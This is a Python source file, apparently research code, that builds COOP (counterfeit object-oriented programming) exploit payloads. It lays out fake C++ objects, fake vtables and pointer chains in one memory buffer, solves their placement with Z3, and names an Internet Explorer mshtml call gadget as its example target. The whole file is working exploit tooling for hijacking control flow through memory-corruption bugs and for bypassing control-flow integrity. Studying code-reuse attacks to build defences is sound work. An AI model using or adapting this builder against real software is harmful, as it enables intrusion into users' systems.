"""
Builder for COOP attack codes.
Author: flxflx / felix.schuster@rub.de
"""

import struct

class Relocator:

    def __init__(self, base0, base1):
        self.base0 = base0
        self.base1 = base1

    def ptr(self, ptr):
        return ptr - self.base0 + self.base1

class Arch:

    class X64:
    
        sizeNativeInt = 8
        @staticmethod
        def packNativeInt(i):
            format = (i < 0) and "<q" or "<Q"
            return struct.pack(format,i)

    class X86:
        
        sizeNativeInt = 4
        @staticmethod
        def packNativeInt(i):
            format = (i < 0) and "<l" or "<L"
            return struct.pack(format,i)

class Memory:
    
    class Region:
        def __len__(self):
            return self.size
    
        def __init__(self, offset, data=None, size=None, label=None):
            """ Constructor.
            @param offset The offset of the memory region.
            @param data [OPTIONAL] Initial data of the region. 
            @param size [OPTIONAL] The size of the region. Must not be None if 'data' is already None.
            @param label [OPTIONAL] The label of the region.
            """
            if data is None:
                assert size is not None
                self.size = size
            else:
                self.size = len(data)

            self.data = data
            self.offset = offset
            self.label = label
        
        def conflicts(self, offset, size):
            return offset in range(self.offset, self.offset + self.size) or self.offset in range(offset, offset + size)

        def setData(self, data):
            assert len(data) == self.size
            self.data = data

    class Pointer(Region):
        """ Placeholder for a pointer to a certain label. """

        def __init__(self, offset, size, targetLabel, targetOffset=0, label=None):
            """ Constructor.
            @param offset The offset of the pointer.
            @param size The size of the pointer.
            @param targetLabel The label to point to.
            @param targetOffset [OPTIONAL] Offset to the label.
            """
            self.targetLabel = targetLabel
            self.targetOffset = targetOffset
            Memory.Region.__init__(self, offset=offset, size=size, label=label)

    FILL_CHAR = '$'
            
    def __init__(self, arch = Arch.X64):
        self.regions = {}
        self.arch = arch
            
    def addRegion(self, region):
        if not self.isRangeFree(region.offset, region.size): return False
        self.regions[region.offset] = region
        return True
        
    def isRangeFree(self, offset, size):
        # TODO: this is not optimal but works
        for region in self.regions.values():
            if region.conflicts(offset, size): return False
            
        return True
        
    def findOffsetForRegion(self, size):
        offsets = self.regions.keys()
        offsets.sort()
        
        offsetFreeRange = 0
        for offset in offsets:
            if offset - offsetFreeRange >= size: break
            region = self.regions[offset]
            offsetFreeRange = region.offset + region.size
        
        return offsetFreeRange
        
    def getBuffer(self):
        offsets = self.regions.keys()
        offsets.sort()
        
        buffer = ""
        nextOffset = 0
        
        for offset in offsets:
            region = self.regions[offset]
            buffer += self.FILL_CHAR * (offset - nextOffset)
            buffer += region.data
            nextOffset = region.offset + region.size
            
        return buffer

    def addLabel(self, offset, size, label):
        """ Adds a label at a certain offset. 
        @param offset The offset of the region to label.
        @param size The size of the region to label.
        @param The identifier of the label (typically an integer).
        @returns True on success.
        """
        return self.addRegion(self.Region(offset, size=size, label=label))

    def addUnresolvedPointer(self, offset, targetLabel, targetOffset=0, label=None):
        """ Adds a placeholder for a pointer to a certain label. 
        Example:
        if your gadget has the following semantics: "dword ptr [dword ptr [ecx+10h]+28h] => 5"
        then chossing offset=0x10, targetOffset=-0x28 and label=XYZ would write the value 5 to the address labeld XYZ.

        @param offset Offset from the beginning of the object in bytes.
        @param targetLabel The label the yet to-be-resolved pointer should point to.
        @paran targetOffset [optional] The offset from the target label the yet to-be-resolved pointer should point to.
        @param label [optional] A unique global label for this pointer.
        """
        return self.addRegion(self.Pointer(offset, self.arch.sizeNativeInt, targetLabel, targetOffset, label))

    def addData(self, offset, data, label=None):
        """ Adds a data region to the object (convenience method). 
        @param offset Offset from the beginning of the object in bytes.
        @param data The data to add.
        @param label A unique global label for the data.
        @returns True on success.
        """
        return self.addRegion(self.Region(offset, data=data, label=label))

    def addPointer(self, offset, value, label=None):
        """ Adds an absolute pointer. """
        assert self.arch.sizeNativeInt in [4,8]
        if self.arch.sizeNativeInt == 4:
            return self.addDword(offset, value, label)
        return self.addQword(offset, value, label)

    def addQword(self, offset, qword=None, label=None):
        if qword is None:
            assert label is not None
            return self.addLabel(offset, 8, label)

        format = (qword < 0) and "<q" or "<Q"
        return self.addData(offset, struct.pack(format,qword), label)

    def addDword(self, offset, dword=None, label=None):
        if dword is None:
            assert label is not None
            return self.addLabel(offset, 4, label)

        format = (dword < 0) and "<l" or "<L"
        return self.addData(offset, struct.pack(format,dword), label)

    def addWord(self, offset, word=None, label=None):
        if word is None:
            assert label is not None
            return self.addLabel(offset, 2, label)

        format = (word < 0) and "<h" or "<H"
        return self.addData(offset, struct.pack(format,word), label)

    def addByte(self, offset, byte=None, label=None):
        if byte is None:
            assert label is not None
            return self.addLabel(offset, 1, label)

        format = (byte < 0) and "<b" or "<B"
        return self.addData(offset, struct.pack(format,byte), label)


    def invalidate(self, offset, size):
        r = Memory.Region(offset, size=size)
        self.addRegion(r)
        return True

    def getSize(self):
        if len(self.regions) == 0: return 0
        offsets = self.regions.keys()
        offsets.sort()
        lastRegion = self.regions[offsets[-1]]
        return lastRegion.offset + lastRegion.size

    def getMaxOffset(self):
        size = self.getSize()
        assert size > 0
        return size-1

    def itRegions(self, dataOnly=True):
        offsets = self.regions.keys()
        offsets.sort()
        for offset in offsets:
            region = self.regions[offset]
            if dataOnly and region.data is None: continue
            yield region

    def itPointers(self):
        offsets = self.regions.keys()
        offsets.sort()
        for offset in offsets:
            region = self.regions[offset]
            if isinstance(region, self.Pointer): yield region

    def resolvePointers(self, lblOffsets, relocator):
        """ Resolves all pointers. 
        @param lblOffsets Dictionary containing offsets of labels.
        @param relocator Relocator for offsets of labels.
        """
        for p in self.itPointers():
            assert p.targetLabel in lblOffsets
            labelOffset = lblOffsets[p.targetLabel]
            targetAddr = relocator.ptr(labelOffset) + p.targetOffset
            p.setData(self.arch.packNativeInt(targetAddr))

class Object:
    """ Describes a fake object that consists at least of a vptr. """

    def __init__(self, vIndex = None, vFunc = None, arch=Arch.X64, noFakeVtable=True, fixedOffset=None):
        """
        @param vIndex [deprecated] the vtable index of the virtual function to call
        @param vFunc [deprecated] the address of the virtual function to call
        @param noFakeVtable [False is deprecated] if true, no false vtable is created
        @param fixedOffset if set, the object is guaranteed to reside at the given address
        """
        self.arch = arch
        self.fixedOffset = fixedOffset
        # create memory map
        self.mem = Memory(arch=arch)
        if noFakeVtable:
            self.vtable = None
        else:
            # reserve region for vptr at offset 0.
            # self.mem.addData(0, arch.packNativeInt(0xDEADBEEF))
            self.vtable = Vtable(arch)
            if vIndex is not None and vFunc is not None:
                assert self.vtable.addEntry(vIndex, vFunc) != False

    def setVptr(self, ptrPtrVfunc, index=0):
        """ Sets the vptr of the object.
        @param ptrPtrVfunc pointer to pointer to vfunc of interest
        @param index [optional] the index the vfunc should have in the vftable
        """
        vptr = ptrPtrVfunc - index * self.arch.sizeNativeInt
        self.mem.addPointer(offset=0, value=vptr)

    def setLabel(self, label):
        """ Sets a label to the object if not one is already present.
        Returns the effective label.
        """
        if 0 not in self.mem.regions:
            self.mem.addLabel(0,1,label)
            return label

        if self.mem.regions[0].label is None:
            self.mem.regions[0].label = label
            return label
        return self.mem.regions[0].label

class Obj32(Object):
    """ Convenience wrapper, same as Object but has arch=Arch.X86 and noFakeVtable=True fixed. """

    def __init__(self, fixedOffset=None):
        Object.__init__(self, noFakeVtable=True, arch=Arch.X86, fixedOffset=fixedOffset)

class Obj64(Object):
    """ Convenience wrapper, same as Object but has arch=Arch.X64 and noFakeVtable=True fixed. """

    def __init__(self, fixedOffset=None):
        Object.__init__(self, noFakeVtable=True, arch=Arch.X64, fixedOffset=fixedOffset)

class Vtable:
    """ Describes a fake vtable. """

    def __init__(self, arch=Arch.X64):
        self.entries = {}
        self.arch = arch

    ## Adds an entry to the object's vtable.
    def addEntry(self, index, func, sanitize = True):
        if sanitize and index in self.entries: return False
        self.entries[index] = func

        return True

    def getBuffer(self, fillChar='$'):
        indeces = self.entries.keys()
        indeces.sort()

        buffer = ""
        nextIndex = 0

        for index in indeces:
            buffer += fillChar * ((index - nextIndex) * self.arch.sizeNativeInt)
            buffer += self.arch.packNativeInt(self.entries[index])
            nextIndex = index + 1

        return buffer

    def getSize(self):
        indeces = self.entries.keys()
        if len(indeces) == 0: return 0
        indeces.sort()
        return (indeces[-1] + 1) * self.arch.sizeNativeInt

class ExpUnsat(Exception):
    def __str__(self):
        return "Constraints on memory model are unsatisfiable."

class BaseBuilder:
    def __init__(self, baseBuff, arch=Arch.X64):
        """ Constructor.
        @param baseBuff Base address of the buffer.
        """
        self.objects = []
        self.baseBuff = baseBuff
        self.arch = arch
        self.objOffsets = None
        self.lblOffsets = None

    def addObj(self, obj):
        """ Add object; returns the objects id """
        self.objects.append(obj)
        return len(self.objects) - 1

    def itObjects(self):
        for objId in range(len(self.objects)):
            obj = self.objects[objId]
            yield (objId, obj)

    def getLastObjectId(self):
        """ Returns the id of the very last object in line. """
        lastObjId = len(self.objects) - 1
        assert lastObjId >= 0
        return lastObjId

    def _getOffsetsObj(self, obj):
        """ Returns a list of offsets at which an object can be found. """
        if self.objOffsets is None: return None
        return [self.objOffsets[objId] for objId, _obj in self.itObjects() if _obj == obj]

    def _calcOffsets(self, maxOffset):
        """ Calculates the global offset for each object and label using Z3.
        Offsets are accessible via the dictionaries self.objOffsets and self.lblOffsets afterwards.
        @param maxOffset The maximum usable offset.
        """
        import z3
        BASE_ID_LABELS = 1000

        # create solver
        s = z3.Solver()
        # create array representing the entire memory range
        a = z3.Array('A', z3.IntSort(), z3.IntSort())

        zObjOffsets = {}
        zLblOffsets = {}
        for objId, obj in self.itObjects():
            zObjOffset = z3.Int("O%d" % objId)
            zObjOffsets[objId] = zObjOffset
            """ Add general constraints for object.
            <global offset object> >= 0
            <global offset object> + <max offset object> <= <global max offset>
            """
            # does this object need to reside at a fixed offset?
            if obj.fixedOffset is not None:
                # if so, add corresponding constraint
                s.add(zObjOffset == obj.fixedOffset)
            else:
                # if not, just make sure it does not get negative
                s.add(zObjOffset >= 0)
            # add constraint regarding the maxOffset
            s.add((zObjOffset + obj.mem.getMaxOffset()) <= maxOffset)

            # iterate over all the object's regions
            for region in obj.mem.regions.values():
                # each region gets the id corresponding to its parent object.
                regionId = objId
                if region.label is not None:
                    # each labeled region gets its unique global id.
                    regionId = BASE_ID_LABELS + region.label
                    # check if we already created an z3 variable for this label's offset.
                    if region.label not in zLblOffsets:
                        temp = z3.Int("L%d" % region.label)
                        zLblOffsets[region.label] = temp
                        """ Add general constraint for label:
                        <global offset label> >= 0
                        """
                        s.add(temp >= 0)

                    # get z3 index for this label's offset
                    zLabel = zLblOffsets[region.label]
                    """ Add constraint for label for this region:
                    <global offset object> + <relative offset region> = <global offset label>
                    """
                    s.add((zObjOffset + region.offset) == zLabel)

                """ Add constraints for each byte in the region to ensure that regions do not overlap:
                A[<global offset byte>] == <id region>
                """
                for byteOffset in range(region.offset, region.offset + region.size):
                    s.add(z3.Select(a, (zObjOffset + byteOffset)) == regionId)

        if s.check().r != 1:
            raise ExpUnsat()

        m = s.model()
        # create offset dictionaries.
        self.objOffsets = {objId : m[zObjOffsets[objId]].as_long() for objId in zObjOffsets}
        self.lblOffsets = {label : m[zLblOffsets[label]].as_long() for label in zLblOffsets}

    def _createObjBuffer(self, objReloc=Relocator(0,0)):
        """ Creates buffer containing all fake objects. Not exlpoit-specific.
        Needs to be invoked after _calcOffsets().
        """
        assert self.objOffsets is not None
        assert self.lblOffsets is not None
        mem = Memory()
        # for all objects...
        for objId, obj in self.itObjects():
            objOffset = self.objOffsets[objId]
            # ... 1) resolve pointers.
            obj.mem.resolvePointers(self.lblOffsets, objReloc)
            # ... 2) iterate over all regions with associated data and add them.
            for region in obj.mem.itRegions(dataOnly=True):
                mem.addData(objOffset + region.offset, region.data)


        return mem.getBuffer()

    def finalize(self, maxSize):
        """ Creates the final buffer.
        @param maxSize the maximum size of the final buffer. Setting a small size may result in unsatisfiable constraints.
        """
        # calc offsets
        self._calcOffsets(maxSize)
        objReloc = Relocator(0, self.baseBuff)

        # create object buffer
        return self._createObjBuffer(objReloc=objReloc)

class ArrayBuilder(BaseBuilder):
    """ Builder for array-based ML-Gs.
    The array starts at label LABEL_ARRAY.
    """

    LABEL_ARRAY = 99
    LABEL_INDEX = 1378414

    def __init__(self, arch, baseBuff, mainObj):
        """
        @param baseBuff the base address of the buffer under control
        @param mainObj the main object (loop gadget), will not be contained in the gadget chain
        """
        BaseBuilder.__init__(self, baseBuff, arch)
        self.notInArray = []
        self.addObj(mainObj, inPtrArray=False)

    def _createArray(self, objReloc=Relocator(0,0), metaReloc=Relocator(0,0)):
        """ Creates buffer containing pointer to objects and vtables.
        Needs to be invoked after _calcOffsets() and before _createObjBuffer().
        EXPLOIT SPECIFIC: needs to be overridden for the actual call gadget.
        This is an exemplary implementation for the call gadget mshtml!CExtendedTagNamespace::Passivate().
        """
        assert self.objOffsets is not None
        # calculate the size of the obj-ptr array
        sizeObjPtrArr = self._calcSizeObjPtrArray()

        # create buffer
        mem = Memory(self.arch)
        currOffsetObjPtr = 0
        currOffsetVtable = sizeObjPtrArr
        for objId, obj in self.itObjects():
            if obj in self.notInArray: continue
            # calc object pointer
            objPtr = objReloc.ptr(self.objOffsets[objId])
            # add object pointer to table
            mem.addData(currOffsetObjPtr, self.arch.packNativeInt(objPtr))
            currOffsetObjPtr += self.arch.sizeNativeInt

        for objId, obj in self.itObjects():

            # Enable fake vtables - added by Richard
            if not obj.vtable is None:
                buffVtable = obj.vtable.getBuffer()
                mem.addData(currOffsetVtable, buffVtable)
                obj.setVptr(metaReloc.ptr(currOffsetVtable))
                currOffsetVtable += len(buffVtable)

        # write buffer to array region
        self.regionArray.setData(mem.getBuffer())

    def _calcSizeObjPtrArray(self):
        """ EXPLOIT SPECIFIC: needs to be overridden for the actual call gadget.
        This is an exemplary implementation for the call gadget mshtml!CExtendedTagNamespace::Passivate().
        """
        return (len(self.objects)-len(self.notInArray)) * self.arch.sizeNativeInt

    def _calcSizeVtables(self):
        # accumulate the sizes of all fake vtables
        sizeVtables = 0
        for objId, obj in self.itObjects():
            if obj.vtable is None: continue
            sizeVtables += obj.vtable.getSize()

        return sizeVtables

    def _calcSizeMetaBuffer(self):
        """ Calculates the size of the meta buffer that is created by _createMetaBuffer().
        """
        return self._calcSizeVtables() + self._calcSizeObjPtrArray()

    def addObj(self, obj, inPtrArray=True):
        """ Adds an object.
        @param obj the object to add
        @param inPtrArray if false, the object is not put into the array. (All regular objects should be put into the array.)
        """
        if not inPtrArray:
            self.notInArray.append(obj)
        BaseBuilder.addObj(self, obj)


    def finalize(self, maxOffset):
        # create object to contain array of object pointers
        objArray = Object(arch=self.arch, noFakeVtable=True)
        self.regionArray = Memory.Region(offset=0, size=self._calcSizeMetaBuffer(), label=self.LABEL_ARRAY)
        objArray.mem.addRegion(self.regionArray)
        self.addObj(objArray, inPtrArray=False)

        # calc offsets
        self._calcOffsets(maxOffset)
        
        # create array of object pointers
        ## create relocator for array
        offsetsArray = self._getOffsetsObj(objArray)
        assert len(offsetsArray) == 1
        arrayReloc = Relocator(0, self.baseBuff + offsetsArray[0])
        ## create relocator for objects
        objReloc = Relocator(0, self.baseBuff)
        self._createArray(objReloc, arrayReloc)

        # create object buffer
        return self._createObjBuffer(objReloc=objReloc)

class LinkedListBuilder(BaseBuilder):
    """ Builder for linked list-based ML-Gs.
    The first linked list item is labeled with LABEL_BASE_LL. The first object is labeled with LABEL_BASE_OBJ.
    Use LABEL_BASE_LL to put a pointer to the first linked list item into your initial object.
    """

    LABEL_CONTAINER = 123948293
    LABEL_BASE_OBJ = 77345
    LABEL_BASE_LL = 52344

    class ObjLabels:
        def __init__(self, labelObj, labelLlItem):
            self.labelObj = labelObj
            self.labelLlItem = labelLlItem

    def __init__(self, baseBuff, offsetPtrObj, offsetPtrNext, mainObj, arch, node_origin_offset=None):
        """
        @param baseBuff the base address of the buffer under control
        @param offsetPtrObj in the given ML-G's linked list item layout, the offset of the pointer to the counterfeit object (e.g. +8 if the item layout is as depicted below)
        @param offsetPtrNext in the given ML-G's linked list item layout, the offset of the pointer to the next/forward pointer (e.g. +0 if the item layout is as depicted below)
        @param mainObj the main object (loop gadget); will not be contained in the gadget chain.
        @param arch the architecture to use.

        Example:
        Consider a linked list item layout as follows:

        template <typename T>
        struct Item
        {
            Item<T>* next;
            T* p;
        };

        For 64-bit, Item comprises of 16 bytes and offsetPtrObj=8 and offsetPtrNext=0 .
        """
        BaseBuilder.__init__(self, baseBuff, arch)
        self.offsetPtrObj = offsetPtrObj
        self.offsetPtrNext = offsetPtrNext
        self.addObj(mainObj, linkedList=False)
        self.loops = {}
        self.labelObj = self.LABEL_BASE_OBJ
        self.labelLl = self.LABEL_BASE_LL
        self.initObj = mainObj
        self.node_origin_offset = node_origin_offset

    def addObj(self, obj, linkedList=True, labelNextItem=None, labelItem=None, lastObj=False):
        """ Adds an object.
        @param obj the object to add
        @param linkedList if false, the object is not put into the linked list. (All regular objects should be put into the linked list.)
        @param labelNextItem [optional] the label of the next item.
        @param labelItem [optinal] the label of the current item.
        @param lastObj [IMPORTANT] is this the last object?
        """
        if linkedList:
            if labelNextItem is None:
                # in the default case, the current label +1 is the label of the next item
                labelNextItem = self.labelLl+1

            if labelItem is None:
                labelItem = self.labelLl

            # add label to start of object
            actualLabelObj = obj.setLabel(self.labelObj)
            ol = self.ObjLabels(actualLabelObj, labelItem)

            # create linked list Item
            item = Object(arch=self.arch)
            # add pointer to next item
            if self.offsetPtrNext == 0:
                if not lastObj:
                    item.mem.addUnresolvedPointer(offset=self.offsetPtrNext, targetLabel=labelNextItem, label=labelItem)
                else:
                    # for the last object we add a dummy next pointer
                    item.mem.addPointer(offset=self.offsetPtrNext, value=0xBABECAFE, label=labelItem)
            else:
                item.setLabel(labelItem)
                if not lastObj:
                    item.mem.addUnresolvedPointer(offset=self.offsetPtrNext, targetLabel=labelNextItem)
                else:
                    # for the last object we add a dummy next pointer
                    item.mem.addPointer(offset=self.offsetPtrNext, value=0xBABECAFE)
            # add pointer to actual object
            item.mem.addUnresolvedPointer(offset=self.offsetPtrObj, targetLabel=actualLabelObj)
            print actualLabelObj

            if not obj.vtable is None:
                self.add_vtable_to_obj(obj)

            # add both object and ll item
            BaseBuilder.addObj(self, obj)
            BaseBuilder.addObj(self, item)

            # increase labels
            self.labelLl += 1
            self.labelObj += 1
            return ol
        else:
            if not obj.vtable is None:
                self.add_vtable_to_obj(obj)
            BaseBuilder.addObj(self, obj)
            return self.ObjLabels(None, None)

    def add_vtable_to_obj(self, obj):
        buffVtable = obj.vtable.getBuffer()
        vtableObj = Object(arch=self.arch)
        vtableObj.mem.addData(0, buffVtable, hash(vtableObj))
        vptr_region = obj.mem.regions.get(0, None)
        label=None
        if vptr_region:
            label = vptr_region.label
            obj.mem.regions.pop(vptr_region.offset)
        obj.mem.addUnresolvedPointer(offset=0, targetLabel=hash(vtableObj), label=label)
        BaseBuilder.addObj(self, vtableObj)

class LooplessBuilder(BaseBuilder):
    """
    Builder for COOP code that does not rely on a conventional ML-G but on a REC-G.
    An example for a REC-G is the following virtual destructor:

    .. code-block:: c++
    
      class X {
          A* a; // class A has a virtual destructor
          B* b; // class B has a virtual destructor
          virtual void X::~X() {
              delete a;
              delete b;
          }
      };

    With "delete a;" the actual vfgadget is invoked, with "delete b;" X::~X() is invoked recursively.

    """

    LABEL_FIRST_OBJ = 100

    class InvocationDescriptor:
        """ Describes an invocation location in the REC-G. E.g., X::~X() has two invocation locations:
        a: vindex=<vtable index of A::~A()>, offsetThisPtr=8
        b: vindex=<vtable index of B::~B()>, offsetThisPtr=16
        """
        def __init__(self, vindex, offsetThisPtr):
            """
            @param vindex the vtable index used at the invocation location.
            @param offsetThisPtr the object offset from which the REC-G reads the this-ptr for the invocation location.
            """
            self.vindex = vindex
            self.offsetThisPtr = offsetThisPtr

    def __init__(self, arch, baseBuff, vindexFirst, ptrVtableRecGadget, descriptors):
        """
        @param arch the architecture.
        @param baseBuff the base of the buffer.
        @param vindexFirst the vtable index used in the first vcall under attacker control.
        @param ptrVtableRecGadget address of a vtable entry of the REC-G.
        @param descriptors list of InvocationDescriptor objects that describe the REC-G's invocation locations.
        """
        BaseBuilder.__init__(self, baseBuff, arch)
        self.vindexFirst = vindexFirst
        self.descriptors = descriptors
        self.nObjSlots = len(self.descriptors)
        self.ptrVtableRecGadget = ptrVtableRecGadget

        # create the first container
        self.container = Object(arch=self.arch, fixedOffset=0)
        self.container.setVptr(self.ptrVtableRecGadget, vindexFirst)
        self.container.setLabel(self.LABEL_FIRST_OBJ)
        BaseBuilder.addObj(self, self.container)
        self.indexObj = 0
        self.nextLabelObj = self.LABEL_FIRST_OBJ + 1

    def addObj(self, obj, ptrVtable):
        """ Adds an object.
        @param obj the object to add.
        @param ptrVtable address of a vtable entry of the vfgadget to use.
        """
        # do we need a new container?
        if (self.indexObj + 1) % self.nObjSlots == 0:
            nextContainer = Object(arch=self.arch)
            self._addObjRaw(nextContainer, self.ptrVtableRecGadget)
            self.container = nextContainer

        self._addObjRaw(obj, ptrVtable)

    def _addObjRaw(self, obj, ptrVtable):
        # get the descriptor of the next invocation slot.
        descriptor = self.descriptors[self.indexObj % self.nObjSlots]
        # add the object to the corresponding slot in the currently active container.
        self.container.mem.addUnresolvedPointer(offset=descriptor.offsetThisPtr, targetLabel=self.nextLabelObj)

        obj.setVptr(ptrVtable, descriptor.vindex)
        obj.setLabel(self.nextLabelObj)
        BaseBuilder.addObj(self, obj)

        self.indexObj += 1
        self.nextLabelObj += 1

class Builder(BaseBuilder):
    """ DEPRECATED example builder used in x64 exploits. 
    Assumes that object pointer array is travsersed in loop gadget.
    The object pointer array is put at the very beginning of the created buffer.
    """

    def _createMetaBuffer(self, objReloc=Relocator(0,0), metaReloc=Relocator(0,0)):
        """ Creates buffer containing pointer to objects and vtables. 
        Needs to be invoked after _calcOffsets() and before _createObjBuffer().
        EXPLOIT SPECIFIC: needs to be overridden for the actual call gadget. 
        This is an exemplary implementation for the call gadget mshtml!CExtendedTagNamespace::Passivate().
        """
        assert self.objOffsets is not None
        # calculate the size of the obj-ptr array
        sizeObjPtrArr = self._calcSizeObjPtrArray()

        # create buffer
        mem = Memory()
        currOffsetObjPtr = 0
        currOffsetVtable = sizeObjPtrArr
        for objId, obj in self.itObjects():
           
            if not obj.vtable is None:
                # write fake vtable
                buffVtable = obj.vtable.getBuffer()
                mem.addData(currOffsetVtable, buffVtable)
                # update vptr in object
                obj.setVptr(metaReloc.ptr(currOffsetVtable))
                currOffsetVtable += len(buffVtable)

            # calc object pointer
            objPtr = objReloc.ptr(self.objOffsets[objId])
            # add object pointer to table
            mem.addData(currOffsetObjPtr, self.arch.packNativeInt(objPtr))
            currOffsetObjPtr += self.arch.sizeNativeInt

        return mem.getBuffer()

    def _calcSizeMetaBuffer(self):
        """ Calculates the size of the meta buffer that is created by _createMetaBuffer().
        """
        return self._calcSizeVtables() + self._calcSizeObjPtrArray()

    def _calcSizeVtables(self):
        # accumulate the sizes of all fake vtables
        sizeVtables = 0
        for objId, obj in self.itObjects():
            if obj.vtable is None: continue
            sizeVtables += obj.vtable.getSize()

        return sizeVtables

    def _calcSizeObjPtrArray(self):
        """ EXPLOIT SPECIFIC: needs to be overridden for the actual call gadget. 
        This is an exemplary implementation for the call gadget mshtml!CExtendedTagNamespace::Passivate().
        """
        return len(self.objects) * self.arch.sizeNativeInt
        
    def finalize(self, maxOffset):
       
        sizeMetaBuffer = self._calcSizeMetaBuffer()
        metaReloc = Relocator(0, self.baseBuff)
        objReloc = Relocator(0, self.baseBuff + sizeMetaBuffer)

        self._calcOffsets(maxOffset - sizeMetaBuffer)
        buffMeta = self._createMetaBuffer(objReloc=objReloc, metaReloc=metaReloc)
        buffObj = self._createObjBuffer(objReloc=objReloc)
        
        return buffMeta + buffObj
